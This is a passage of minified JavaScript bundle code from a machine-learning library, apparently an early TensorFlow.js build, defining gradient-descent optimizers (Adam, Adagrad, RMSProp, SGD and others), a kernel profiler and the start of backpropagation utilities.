i(e,t),e.prototype.applyGradients=function(t){var e=this,n=function(n){var i=o.ENV.engine.registeredVariables[n];if(null==r.accumulatedGrads[n]){s.tidy((function(){e.accumulatedGrads[n]=u.zerosLike(i).variable(false)}))}if(null==r.accumulatedUpdates[n]){s.tidy((function(){e.accumulatedUpdates[n]=u.zerosLike(i).variable(false)}))}var a=t[n],c=r.accumulatedGrads[n],l=r.accumulatedUpdates[n];s.tidy((function(){var t=e.rho.mul(c).add(e.oneMinusRho.mul(a.square())),r=l.add(e.epsilon).sqrt().div(c.add(e.epsilon).sqrt()).mul(a),o=e.rho.mul(l).add(e.oneMinusRho.mul(r.square()));e.accumulatedGrads[n].assign(t),e.accumulatedUpdates[n].assign(o);var s=e.c.mul(r).add(i);i.assign(s)}))},r=this;for(var i in t)n(i)},e.prototype.beforeBatch=function(e,n,r,i,o){var s=this;t.prototype.beforeBatch.call(this,e,n,r,i,o),0===this.accumulatedSquaredGradientsGraph.size()&&this.variableNodes.forEach((function(t){s.accumulatedSquaredGradientsGraph.set(t.output,c.Tensor.zeros(t.output.shape)),s.accumulatedUpdatesGraph.set(t.output,c.Tensor.zeros(t.output.shape))}))},e.prototype.afterBatch=function(t,e,n,r,i){var o=this;null==this.one&&(this.one=s.keep(u.scalar(1))),s.tidy((function(){o.variableNodes.forEach((function(e){var n=r.get(e.output),i=o.variableGradients.get(e.output),a=o.accumulatedSquaredGradientsGraph.get(e.output),u=o.accumulatedUpdatesGraph.get(e.output),c=t.multiply(i,i),l=t.scaledArrayAdd(o.rho,a,t.subtract(o.one,o.rho),c),h=t.multiply(t.divide(t.sqrt(t.add(u,o.epsilon)),t.sqrt(t.add(a,o.epsilon))),i),p=t.scaledArrayAdd(o.cGraph,h,o.one,n),d=t.multiply(h,h),f=t.scaledArrayAdd(o.rho,u,t.subtract(o.one,o.rho),d);o.accumulatedSquaredGradientsGraph.set(e.output,s.keep(l)),o.accumulatedUpdatesGraph.set(e.output,s.keep(f)),r.set(e.output,s.keep(p)),e.data=p,n.dispose(),a.dispose(),u.dispose()}))})),this.variableGradients.dispose(),this.variableGradients=new a.TensorArrayMap},e.prototype.dispose=function(){var e=this;t.prototype.dispose.call(this),this.c.dispose(),this.epsilon.dispose(),this.rho.dispose(),this.oneMinusRho.dispose(),null!=this.one&&this.one.dispose(),null!=this.accumulatedSquaredGradientsGraph&&this.accumulatedSquaredGradientsGraph.dispose(),null!=this.accumulatedUpdatesGraph&&this.accumulatedUpdatesGraph.dispose(),null!=this.accumulatedUpdates&&(Object.keys(this.accumulatedUpdates).forEach((function(t){return e.accumulatedUpdates[t].dispose()})),Object.keys(this.accumulatedGrads).forEach((function(t){return e.accumulatedGrads[t].dispose()})))},e}(t("./optimizer").Optimizer);n.AdadeltaOptimizer=l},{"../environment":27,"../globals":28,"../graph/tensor_array_map":59,"../ops/ops":114,"../tensor":137,"./optimizer":131}],127:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../environment"),s=t("../globals"),a=t("../graph/tensor_array_map"),u=t("../ops/ops"),c=t("../tensor"),l=function(t){function e(e,n,r){void 0===r&&(r=.1);var i=t.call(this,e,n)||this;return i.learningRate=e,i.initialAccumulatorValue=r,i.accumulatedGrads={},i.accumulatedSquaredGradients=new a.TensorArrayMap,i.c=s.keep(u.scalar(-e)),i.epsilon=s.keep(u.scalar(1e-8)),i}return i(e,t),e.prototype.applyGradients=function(t){var e=this,n=function(n){var i=o.ENV.engine.registeredVariables[n];if(null==r.accumulatedGrads[n]){s.tidy((function(){e.accumulatedGrads[n]=u.fill(i.shape,e.initialAccumulatorValue).variable(false)}))}var a=t[n],c=r.accumulatedGrads[n];s.tidy((function(){var t=c.add(a.square());e.accumulatedGrads[n].assign(t);var r=e.c.mul(a.div(t.add(e.epsilon).sqrt())).add(i);i.assign(r)}))},r=this;for(var i in t)n(i)},e.prototype.beforeBatch=function(e,n,r,i,o){var s=this;t.prototype.beforeBatch.call(this,e,n,r,i,o),0===this.accumulatedSquaredGradients.size()&&this.variableNodes.forEach((function(t){s.accumulatedSquaredGradients.set(t.output,c.Tensor.zeros(t.output.shape))}))},e.prototype.afterBatch=function(t,e,n,r,i){var o=this;null==this.one&&(this.one=s.keep(u.scalar(1))),s.tidy((function(){o.variableNodes.forEach((function(e){var n=r.get(e.output),i=o.variableGradients.get(e.output),a=o.accumulatedSquaredGradients.get(e.output),u=t.multiply(i,i),c=t.add(a,u),l=t.scaledArrayAdd(o.cGraph,t.divide(i,t.add(t.sqrt(c),o.epsilon)),o.one,n);o.accumulatedSquaredGradients.set(e.output,s.keep(c)),r.set(e.output,s.keep(l)),e.data=l,n.dispose(),a.dispose()}))})),this.variableGradients.dispose(),this.variableGradients=new a.TensorArrayMap},e.prototype.dispose=function(){var e=this;t.prototype.dispose.call(this),this.epsilon.dispose(),this.c.dispose(),null!=this.one&&this.one.dispose(),null!=this.accumulatedSquaredGradients&&this.accumulatedSquaredGradients.dispose(),null!=this.accumulatedGrads&&Object.keys(this.accumulatedGrads).forEach((function(t){return e.accumulatedGrads[t].dispose()}))},e}(t("./optimizer").Optimizer);n.AdagradOptimizer=l},{"../environment":27,"../globals":28,"../graph/tensor_array_map":59,"../ops/ops":114,"../tensor":137,"./optimizer":131}],128:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../environment"),s=t("../globals"),a=t("../graph/tensor_array_map"),u=t("../ops/ops"),c=t("../tensor"),l=function(t){function e(e,n,r,i,o){void 0===i&&(i=1e-8);var c=t.call(this,e,o)||this;return c.learningRate=e,c.accumulatedFirstMoment={},c.accumulatedSecondMoment={},c.firstMomentGraph=new a.TensorArrayMap,c.secondMomentGraph=new a.TensorArrayMap,c.c=s.keep(u.scalar(-e)),c.eps=s.keep(u.scalar(i)),c.beta1=s.keep(u.scalar(n)),c.beta2=s.keep(u.scalar(r)),s.tidy((function(){c.accBeta1=u.scalar(n).variable(),c.accBeta2=u.scalar(r).variable()})),c.oneMinusBeta1=s.keep(u.scalar(1-n)),c.oneMinusBeta2=s.keep(u.scalar(1-r)),c.one=s.keep(u.scalar(1)),c}return i(e,t),e.prototype.applyGradients=function(t){var e=this;s.tidy((function(){var n=e.one.sub(e.accBeta1),r=e.one.sub(e.accBeta2);for(var i in t){var s=o.ENV.engine.registeredVariables[i];if(null==e.accumulatedFirstMoment[i]){var a=!1;e.accumulatedFirstMoment[i]=u.zerosLike(s).variable(a)}if(null==e.accumulatedSecondMoment[i]){a=!1;e.accumulatedSecondMoment[i]=u.zerosLike(s).variable(a)}var c=t[i],l=e.accumulatedFirstMoment[i],h=e.accumulatedSecondMoment[i],p=e.beta1.mul(l).add(e.oneMinusBeta1.mul(c)),d=e.beta2.mul(h).add(e.oneMinusBeta2.mul(c.square())),f=p.div(n),y=d.div(r);e.accumulatedFirstMoment[i].assign(p),e.accumulatedSecondMoment[i].assign(d);var m=e.c.mul(f.div(e.eps.add(y.sqrt()))).add(s);s.assign(m)}e.accBeta1.assign(e.accBeta1.mul(e.beta1)),e.accBeta2.assign(e.accBeta2.mul(e.beta2))}))},e.prototype.beforeBatch=function(e,n,r,i,o){var s=this;t.prototype.beforeBatch.call(this,e,n,r,i,o),0===this.firstMomentGraph.size()&&this.variableNodes.forEach((function(t){s.firstMomentGraph.set(t.output,c.Tensor.zeros(t.output.shape))})),0===this.secondMomentGraph.size()&&this.variableNodes.forEach((function(t){s.secondMomentGraph.set(t.output,c.Tensor.zeros(t.output.shape))}))},e.prototype.afterBatch=function(t,e,n,r,i){var o=this;s.tidy((function(){var e=o.one.sub(o.accBeta1),n=o.one.sub(o.accBeta2);o.variableNodes.forEach((function(i){var a=r.get(i.output),u=o.variableGradients.get(i.output),c=o.firstMomentGraph.get(i.output),l=o.secondMomentGraph.get(i.output),h=t.scaledArrayAdd(o.beta1,c,o.oneMinusBeta1,u),p=t.scaledArrayAdd(o.beta2,l,o.oneMinusBeta2,u.square()),d=h.div(e),f=p.div(n),y=t.scaledArrayAdd(o.cGraph,d.div(o.eps.add(f.sqrt())),o.one,a);r.set(i.output,s.keep(y)),i.data=y,o.firstMomentGraph.set(i.output,s.keep(h)),o.secondMomentGraph.set(i.output,s.keep(p)),a.dispose(),u.dispose(),c.dispose(),l.dispose()})),o.accBeta1.assign(o.accBeta1.mul(o.beta1)),o.accBeta2.assign(o.accBeta2.mul(o.beta2))})),this.variableGradients.dispose(),this.variableGradients=new a.TensorArrayMap},e.prototype.dispose=function(){var e=this;t.prototype.dispose.call(this),this.c.dispose(),this.eps.dispose(),this.beta1.dispose(),this.beta2.dispose(),this.accBeta1.dispose(),this.accBeta2.dispose(),this.oneMinusBeta1.dispose(),this.oneMinusBeta2.dispose(),this.one.dispose(),null!=this.firstMomentGraph&&this.firstMomentGraph.dispose(),null!=this.secondMomentGraph&&this.secondMomentGraph.dispose(),null!=this.accumulatedFirstMoment&&Object.keys(this.accumulatedFirstMoment).forEach((function(t){return e.accumulatedFirstMoment[t].dispose()})),null!=this.accumulatedSecondMoment&&Object.keys(this.accumulatedSecondMoment).forEach((function(t){return e.accumulatedSecondMoment[t].dispose()}))},e}(t("./optimizer").Optimizer);n.AdamOptimizer=l},{"../environment":27,"../globals":28,"../graph/tensor_array_map":59,"../ops/ops":114,"../tensor":137,"./optimizer":131}],129:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../environment"),s=t("../globals"),a=t("../graph/tensor_array_map"),u=t("../ops/ops"),c=t("../tensor"),l=function(t){function e(e,n,r,i,o,c){void 0===i&&(i=1e-8),void 0===o&&(o=0);var l=t.call(this,e,c)||this;return l.learningRate=e,l.accumulatedFirstMoment={},l.accumulatedWeightedInfNorm={},l.firstMomentGraph=new a.TensorArrayMap,l.weightedInfNormGraph=new a.TensorArrayMap,l.c=s.keep(u.scalar(-e)),l.eps=s.keep(u.scalar(i)),l.beta1=s.keep(u.scalar(n)),l.beta2=s.keep(u.scalar(r)),l.decay=s.keep(u.scalar(o)),s.tidy((function(){l.iteration=u.scalar(0).variable(),l.accBeta1=u.scalar(n).variable()})),l.oneMinusBeta1=s.keep(u.scalar(1-n)),l.one=s.keep(u.scalar(1)),l}return i(e,t),e.prototype.applyGradients=function(t){var e=this;s.tidy((function(){var n=e.one.sub(e.accBeta1),r=e.c.div(e.one.add(e.decay.mul(e.iteration)));for(var i in t){var s=o.ENV.engine.registeredVariables[i];if(null==e.accumulatedFirstMoment[i]){var a=!1;e.accumulatedFirstMoment[i]=u.zerosLike(s).variable(a)}if(null==e.accumulatedWeightedInfNorm[i]){a=!1;e.accumulatedWeightedInfNorm[i]=u.zerosLike(s).variable(a)}var c=t[i],l=e.accumulatedFirstMoment[i],h=e.accumulatedWeightedInfNorm[i],p=e.beta1.mul(l).add(e.oneMinusBeta1.mul(c)),d=e.beta2.mul(h),f=c.abs(),y=d.maximum(f);e.accumulatedFirstMoment[i].assign(p),e.accumulatedWeightedInfNorm[i].assign(y);var m=r.div(n).mul(p.div(e.eps.add(y))).add(s);s.assign(m)}e.iteration.assign(e.iteration.add(e.one)),e.accBeta1.assign(e.accBeta1.mul(e.beta1))}))},e.prototype.beforeBatch=function(e,n,r,i,o){var s=this;t.prototype.beforeBatch.call(this,e,n,r,i,o),0===this.firstMomentGraph.size()&&this.variableNodes.forEach((function(t){s.firstMomentGraph.set(t.output,c.Tensor.zeros(t.output.shape))})),0===this.weightedInfNormGraph.size()&&this.variableNodes.forEach((function(t){s.weightedInfNormGraph.set(t.output,c.Tensor.zeros(t.output.shape))}))},e.prototype.afterBatch=function(t,e,n,r,i){var o=this;s.tidy((function(){var e=o.cGraph.div(o.one.add(o.decay.mul(o.iteration)));o.variableNodes.forEach((function(n){var i=r.get(n.output),a=o.variableGradients.get(n.output),u=o.firstMomentGraph.get(n.output),c=o.weightedInfNormGraph.get(n.output),l=t.scaledArrayAdd(o.beta1,u,o.oneMinusBeta1,a),h=o.beta2.mul(c),p=a.abs(),d=h.maximum(p),f=t.scaledArrayAdd(o.one,i,e.div(o.one.sub(o.accBeta1)),l.div(o.eps.add(d)));r.set(n.output,s.keep(f)),n.data=f,o.firstMomentGraph.set(n.output,s.keep(l)),o.weightedInfNormGraph.set(n.output,s.keep(d)),i.dispose(),a.dispose(),u.dispose(),c.dispose()})),o.iteration.assign(o.iteration.add(o.one)),o.accBeta1.assign(o.accBeta1.mul(o.beta1))})),this.variableGradients.dispose(),this.variableGradients=new a.TensorArrayMap},e.prototype.dispose=function(){var e=this;t.prototype.dispose.call(this),this.c.dispose(),this.eps.dispose(),this.accBeta1.dispose(),this.beta1.dispose(),this.beta2.dispose(),this.oneMinusBeta1.dispose(),this.decay.dispose(),this.iteration.dispose(),this.one.dispose(),null!=this.firstMomentGraph&&this.firstMomentGraph.dispose(),null!=this.weightedInfNormGraph&&this.weightedInfNormGraph.dispose(),null!=this.accumulatedFirstMoment&&Object.keys(this.accumulatedFirstMoment).forEach((function(t){return e.accumulatedFirstMoment[t].dispose()})),null!=this.accumulatedWeightedInfNorm&&Object.keys(this.accumulatedWeightedInfNorm).forEach((function(t){return e.accumulatedWeightedInfNorm[t].dispose()}))},e}(t("./optimizer").Optimizer);n.AdamaxOptimizer=l},{"../environment":27,"../globals":28,"../graph/tensor_array_map":59,"../ops/ops":114,"../tensor":137,"./optimizer":131}],130:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../environment"),s=t("../globals"),a=t("../graph/tensor_array_map"),u=t("../ops/ops"),c=t("../tensor"),l=function(t){function e(e,n,r,i){void 0===i&&(i=!1);var o=t.call(this,e,r)||this;return o.learningRate=e,o.momentum=n,o.useNesterov=i,o.m=u.scalar(o.momentum),o.accumulations={},o}return i(e,t),e.prototype.applyGradients=function(t){var e=this,n=function(n){var i=o.ENV.engine.registeredVariables[n];if(null==r.accumulations[n]){s.tidy((function(){e.accumulations[n]=u.zerosLike(i).variable(false)}))}var a=r.accumulations[n],c=t[n];s.tidy((function(){var t,r=e.m.mul(a).add(c);t=e.useNesterov?e.c.mul(c.add(r.mul(e.m))).add(i):e.c.mul(r).add(i),e.accumulations[n].assign(r),i.assign(t)}))},r=this;for(var i in t)n(i)},e.prototype.beforeBatch=function(e,n,r,i,o){var s=this;null==this.variableVelocitiesGraph&&(this.variableVelocitiesGraph=new a.TensorArrayMap),t.prototype.beforeBatch.call(this,e,n,r,i,o),0===this.variableVelocitiesGraph.size()&&this.variableNodes.forEach((function(t){s.variableVelocitiesGraph.set(t.output,c.Tensor.zeros(t.output.shape))}))},e.prototype.afterBatch=function(t,e,n,r,i){var o=this;s.tidy((function(){o.variableNodes.forEach((function(t){var e,n=r.get(t.output),i=o.variableGradients.get(t.output),a=o.variableVelocitiesGraph.get(t.output),u=o.m.mul(a).add(i);e=o.useNesterov?o.cGraph.mul(i.add(u.mul(o.m))).add(n):o.cGraph.mul(u).add(n),o.variableVelocitiesGraph.set(t.output,s.keep(u)),r.set(t.output,s.keep(e)),t.data=e,n.dispose(),a.dispose()}))})),this.variableGradients.dispose(),this.variableGradients=new a.TensorArrayMap},e.prototype.dispose=function(){if(t.prototype.dispose.call(this),this.m.dispose(),null!=this.variableVelocitiesGraph&&this.variableVelocitiesGraph.dispose(),null!=this.accumulations)for(var e in this.accumulations)this.accumulations[e].dispose()},e.prototype.setMomentum=function(t){this.momentum=t},e}(t("./sgd_optimizer").SGDOptimizer);n.MomentumOptimizer=l},{"../environment":27,"../globals":28,"../graph/tensor_array_map":59,"../ops/ops":114,"../tensor":137,"./sgd_optimizer":134}],131:[function(t,e,n){"use strict";var r=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s};Object.defineProperty(n,"__esModule",{value:!0});var i=t("../doc"),o=t("../globals"),s=t("../graph/session_util"),a=t("../graph/tensor_array_map"),u=t("../ops/ops"),c=t("../tensor"),l=function(){function t(t,e){this.learningRate=t,this.variableGradients=new a.TensorArrayMap,null!=e&&(this.specifiedVariableNodes=e)}return t.prototype.minimize=function(t,e,n){void 0===e&&(e=!1);var r=this.computeGradients(t,n),i=r.value,o=r.grads;return this.applyGradients(o),Object.keys(o).forEach((function(t){return o[t].dispose()})),e?i:(i.dispose(),null)},t.prototype.computeGradients=function(t,e){return o.variableGrads(t,e)},t.prototype.beforeBatch=function(t,e,n,r,i){var o=this;this.variableNodes=null==this.specifiedVariableNodes?s.getVariableNodesFromEvaluationSet(n.nodes):this.specifiedVariableNodes,e!==this.prevBatchSize&&(null!=this.cGraph&&this.cGraph.dispose(),this.prevBatchSize=e,this.cGraph=t.keep(u.scalar(-this.learningRate/e))),this.variableNodes.forEach((function(e){return o.variableGradients.set(e.output,t.keep(c.Tensor.zeros(e.output.shape)))}))},t.prototype.afterExample=function(t,e,n,r){var i=this;o.tidy((function(){i.variableNodes.forEach((function(e){var n=r.get(e.output),s=i.variableGradients.get(e.output);i.variableGradients.set(e.output,o.keep(t.add(n,s))),s.dispose()}))}))},t.prototype.dispose=function(){null!=this.cGraph&&this.cGraph.dispose(),null!=this.variableNodes&&this.variableNodes.forEach((function(t){t.data.dispose()})),null!=this.specifiedVariableNodes&&this.specifiedVariableNodes.forEach((function(t){t.data.dispose()}))},r([i.doc({heading:"Training",subheading:"Optimizers"})],t.prototype,"minimize",null),t=r([i.doc({heading:"Training",subheading:"Classes",namespace:"train"})],t)}();n.Optimizer=l},{"../doc":25,"../globals":28,"../graph/session_util":58,"../graph/tensor_array_map":59,"../ops/ops":114,"../tensor":137}],132:[function(t,e,n){"use strict";var r=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s};Object.defineProperty(n,"__esModule",{value:!0});var i=t("../doc"),o=t("./adadelta_optimizer"),s=t("./adagrad_optimizer"),a=t("./adam_optimizer"),u=t("./adamax_optimizer"),c=t("./momentum_optimizer"),l=t("./rmsprop_optimizer"),h=t("./sgd_optimizer"),p=function(){function t(){}return t.sgd=function(t){return new h.SGDOptimizer(t)},t.momentum=function(t,e,n){return void 0===n&&(n=!1),new c.MomentumOptimizer(t,e,void 0,n)},t.rmsprop=function(t,e,n,r){return void 0===e&&(e=.9),void 0===n&&(n=0),void 0===r&&(r=1e-8),new l.RMSPropOptimizer(t,e,n,void 0,r)},t.adam=function(t,e,n,r){return void 0===t&&(t=.001),void 0===e&&(e=.9),void 0===n&&(n=.999),void 0===r&&(r=1e-8),new a.AdamOptimizer(t,e,n,r,void 0)},t.adadelta=function(t,e,n){return void 0===t&&(t=.001),void 0===e&&(e=.95),void 0===n&&(n=1e-8),new o.AdadeltaOptimizer(t,e,void 0,n)},t.adamax=function(t,e,n,r,i){return void 0===t&&(t=.002),void 0===e&&(e=.9),void 0===n&&(n=.999),void 0===r&&(r=1e-8),void 0===i&&(i=0),new u.AdamaxOptimizer(t,e,n,r,i,void 0)},t.adagrad=function(t,e){return void 0===e&&(e=.1),new s.AdagradOptimizer(t,void 0,e)},r([i.doc({heading:"Training",subheading:"Optimizers",namespace:"train"})],t,"sgd",null),r([i.doc({heading:"Training",subheading:"Optimizers",namespace:"train"})],t,"momentum",null),r([i.doc({heading:"Training",subheading:"Optimizers",namespace:"train"})],t,"rmsprop",null),r([i.doc({heading:"Training",subheading:"Optimizers",namespace:"train"})],t,"adam",null),r([i.doc({heading:"Training",subheading:"Optimizers",namespace:"train"})],t,"adadelta",null),r([i.doc({heading:"Training",subheading:"Optimizers",namespace:"train"})],t,"adamax",null),r([i.doc({heading:"Training",subheading:"Optimizers",namespace:"train"})],t,"adagrad",null),t}();n.OptimizerConstructors=p},{"../doc":25,"./adadelta_optimizer":126,"./adagrad_optimizer":127,"./adam_optimizer":128,"./adamax_optimizer":129,"./momentum_optimizer":130,"./rmsprop_optimizer":133,"./sgd_optimizer":134}],133:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../environment"),s=t("../globals"),a=t("../graph/session_util"),u=t("../graph/tensor_array_map"),c=t("../ops/ops"),l=t("../tensor"),h=function(t){function e(e,n,r,i,o){void 0===n&&(n=.9),void 0===r&&(r=0),void 0===o&&(o=1e-8);var a=t.call(this,e,i)||this;return a.learningRate=e,a.accumulatedMeanSquares={},a.accumulatedMoments={},a.accumulatedMeanSquaredGraph=new u.TensorArrayMap,a.accumulatedMomentGraph=new u.TensorArrayMap,a.c=s.keep(c.scalar(e)),a.epsilon=s.keep(c.scalar(o)),a.decay=s.keep(c.scalar(n)),a.momentum=s.keep(c.scalar(r)),a.oneMinusDecay=s.keep(c.scalar(1-n)),a}return i(e,t),e.prototype.applyGradients=function(t){var e=this,n=function(n){var i=o.ENV.engine.registeredVariables[n];if(null==r.accumulatedMeanSquares[n]){s.tidy((function(){e.accumulatedMeanSquares[n]=c.zerosLike(i).variable(false)}))}if(null==r.accumulatedMoments[n]){s.tidy((function(){e.accumulatedMoments[n]=c.zerosLike(i).variable(false)}))}var a=r.accumulatedMeanSquares[n],u=r.accumulatedMoments[n],l=t[n];s.tidy((function(){var t=e.decay.mul(a).add(e.oneMinusDecay.mul(l.square())),r=e.momentum.mul(u).add(e.c.mul(l).div(t.add(e.epsilon).sqrt()));e.accumulatedMeanSquares[n].assign(t),e.accumulatedMoments[n].assign(r);var o=i.sub(r);i.assign(o)}))},r=this;for(var i in t)n(i)},e.prototype.beforeBatch=function(t,e,n,r,i){var o=this;this.variableNodes=null==this.specifiedVariableNodes?a.getVariableNodesFromEvaluationSet(n.nodes):this.specifiedVariableNodes,e!==this.prevBatchSize&&(null!=this.cGraph&&this.cGraph.dispose(),this.prevBatchSize=e,this.cGraph=t.keep(c.scalar(this.learningRate/e))),this.variableNodes.forEach((function(e){return o.variableGradients.set(e.output,t.keep(l.Tensor.zeros(e.output.shape)))})),0===this.accumulatedMeanSquaredGraph.size()&&this.variableNodes.forEach((function(t){o.accumulatedMeanSquaredGraph.set(t.output,l.Tensor.zeros(t.output.shape)),o.accumulatedMomentGraph.set(t.output,l.Tensor.zeros(t.output.shape))}))},e.prototype.afterBatch=function(t,e,n,r,i){var o=this;s.tidy((function(){o.variableNodes.forEach((function(e){var n=r.get(e.output),i=o.variableGradients.get(e.output),a=o.accumulatedMeanSquaredGraph.get(e.output),u=o.accumulatedMomentGraph.get(e.output),c=t.scaledArrayAdd(o.decay,a,o.oneMinusDecay,i.square()),l=t.scaledArrayAdd(o.momentum,u,o.cGraph,i.div(c.add(o.epsilon).sqrt())),h=n.sub(l);o.accumulatedMeanSquaredGraph.set(e.output,s.keep(c)),o.accumulatedMomentGraph.set(e.output,s.keep(l)),r.set(e.output,s.keep(h)),e.data=h,n.dispose(),a.dispose(),u.dispose()}))})),this.variableGradients.dispose(),this.variableGradients=new u.TensorArrayMap},e.prototype.dispose=function(){var e=this;t.prototype.dispose.call(this),this.c.dispose(),this.epsilon.dispose(),this.decay.dispose(),this.momentum.dispose(),this.oneMinusDecay.dispose(),null!=this.accumulatedMeanSquaredGraph&&this.accumulatedMeanSquaredGraph.dispose(),null!=this.accumulatedMomentGraph&&this.accumulatedMomentGraph.dispose(),null!=this.accumulatedMeanSquares&&Object.keys(this.accumulatedMeanSquares).forEach((function(t){return e.accumulatedMeanSquares[t].dispose()})),null!=this.accumulatedMoments&&Object.keys(this.accumulatedMoments).forEach((function(t){return e.accumulatedMoments[t].dispose()}))},e}(t("./optimizer").Optimizer);n.RMSPropOptimizer=h},{"../environment":27,"../globals":28,"../graph/session_util":58,"../graph/tensor_array_map":59,"../ops/ops":114,"../tensor":137,"./optimizer":131}],134:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../environment"),s=t("../globals"),a=t("../graph/tensor_array_map"),u=t("../ops/ops"),c=function(t){function e(e,n){var r=t.call(this,e,n)||this;return r.learningRate=e,r.setLearningRate(e),r}return i(e,t),e.prototype.applyGradients=function(t){var e=this;Object.keys(t).forEach((function(n){var r=t[n],i=o.ENV.engine.registeredVariables[n];s.tidy((function(){var t=e.c.mul(r).add(i);i.assign(t)}))}))},e.prototype.setLearningRate=function(t){this.learningRate=t,null!=this.c&&this.c.dispose(),this.c=o.ENV.math.keep(u.scalar(-t))},e.prototype.dispose=function(){this.c.dispose(),null!=this.one&&this.one.dispose(),t.prototype.dispose.call(this)},e.prototype.afterBatch=function(t,e,n,r,i){var o=this;null==this.one&&(this.one=s.keep(u.scalar(1))),s.tidy((function(){o.variableNodes.forEach((function(e){var n=r.get(e.output),i=o.variableGradients.get(e.output),a=t.scaledArrayAdd(o.cGraph,i,o.one,n);r.set(e.output,s.keep(a)),e.data=a,n.dispose()}))})),this.variableGradients.dispose(),this.variableGradients=new a.TensorArrayMap},e}(t("./optimizer").Optimizer);n.SGDOptimizer=c},{"../environment":27,"../globals":28,"../graph/tensor_array_map":59,"../ops/ops":114,"./optimizer":131}],135:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("./util"),i=function(){function t(t,e){this.backendTimer=t,this.logger=e,null==e&&(this.logger=new o)}return t.prototype.profileKernel=function(t,e){var n,i=this,o=this.backendTimer.time((function(){n=e()})),s=n.dataSync();return r.checkForNaN(s,n.dtype,t),o.then((function(e){i.logger.logKernelProfile(t,n,s,e.kernelMs)})),n},t}();n.Profiler=i;var o=function(){function t(){}return t.prototype.logKernelProfile=function(t,e,n,i){var o=r.rightPad(i+"ms",9),s=r.rightPad(t,25),a=e.rank,u=e.size,c=r.rightPad(e.shape.toString(),14);console.log("%c"+s+"\t%c"+o+"\t%c"+a+"D "+c+"\t%c"+u,"font-weight:bold","color:red","color:blue","color: orange")},t}();n.Logger=o},{"./util":143}],136:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("./util");n.getFilteredNodesXToY=function(t,e,n){for(var r={},i={},o=0;o<e.length;o++)r[e[o].id]=!0;for(o=0;o<t.length;o++){var s=(y=t[o]).inputs;for(var a in s){for(var u=s[a],c=!1,l=0;l<e.length;l++)if(r[u.id]){r[y.output.id]=!0,c=!0,i[y.id]=!0;break}if(c)break}}var h={};h[n.id]=!0;var p={};for(o=t.length-1;o>=0;o--){s=(y=t[o]).inputs;var d=[];d.push(y.output);for(l=0;l<d.length;l++)if(h[d[l].id]){for(var a in s)h[s[a].id]=!0,p[y.id]=!0;break}}var f=[];for(o=0;o<t.length;o++){var y;if(i[(y=t[o]).id]&&p[y.id]){var m={};for(var a in y.inputs){var v=y.inputs[a];r[v.id]&&(m[a]=v)}var g=Object.assign({},y);g.inputs=m,g.output=y.output,f.push(g)}}return f},n.backpropagateGradients=function(t,e){for(var n=e.length-1;n>=0;n--){var i=e[n],o=t[i.output.id];if(null==i.gradient)throw new Error("Cannot compute gradient: gradient function not found for "+i.name+".");var s=i.gradient(o);for(var a in i.inputs){if(!(a in s))throw new Error("Cannot backprop through input "+a+". Available gradients found: "+Object.keys(s)+".");var u=s[a](),c=i.inputs[a];if(!r.arraysEqual(u.shape,c.shape))throw new Error("Error in gradient for op "+i.name+". The gradient of input '"+a+"' has shape '"+u.shape+"', which does not match the shape of the input '"+c.shape+"'");if(null==t[c.id])t[c.id]=u;else{var 